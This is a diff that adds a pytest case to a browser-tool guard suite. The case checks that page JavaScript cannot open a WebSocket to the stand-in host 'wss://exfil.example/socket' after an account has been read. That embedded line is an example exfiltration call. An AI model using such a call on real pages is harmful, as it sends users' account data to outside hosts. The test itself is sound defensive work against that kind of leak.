@@ -103,6 +103,28 @@ def test_account_page_cannot_exfiltrate_during_its_own_load():
         b.stop()
 
 
+def test_account_page_cannot_open_public_websocket():
+    state = BrowseState(account_read=True)
+    b = BrowserTool(headless=True, persistent=False, guard=lambda u: web_guard.allowed(u, state))
+    try:
+        b.start()
+    except Exception as exc:
+        pytest.skip(f"Chromium indisponible : {exc}")
+    try:
+        closed = b._page.evaluate(
+            """() => new Promise(resolve => {
+                const ws = new WebSocket('wss://exfil.example/socket');
+                ws.onclose = event => resolve(event.code);
+                ws.onerror = () => {};
+                setTimeout(() => resolve(-1), 1500);
+            })"""
+        )
+        assert closed == 1008
+        assert b.blocked == ["wss://exfil.example/socket"]
+    finally:
+        b.stop()
+
+
 def test_public_pages_still_load_before_any_account_read():
     state = BrowseState()
     b = SimulatedNetwork(headless=True, persistent=False, guard=lambda u: web_guard.allowed(u, state))
